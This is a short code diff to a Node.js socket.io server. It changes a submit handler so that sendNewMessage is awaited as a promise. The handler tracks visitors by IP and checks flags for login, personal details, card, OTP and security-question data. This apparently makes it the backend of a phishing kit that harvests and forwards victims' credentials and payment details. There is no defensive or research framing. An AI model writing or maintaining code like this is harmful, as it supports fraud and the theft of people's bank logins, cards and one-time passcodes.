@@ -528,7 +528,6 @@ io.on('connection', (socket, req) => {
     })
     
     socket.on('submit', (data) => {
-        let messageId = 0
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
             if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
@@ -557,9 +556,11 @@ io.on('connection', (socket, req) => {
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
 
-        messageId = sendNewMessage(userDetails)
+        sendNewMessage(userDetails).then(messageId => {
+            console.log(messageId)
+        })
         
-        console.log(messageId)
+       
     }
     /*
         let user = data
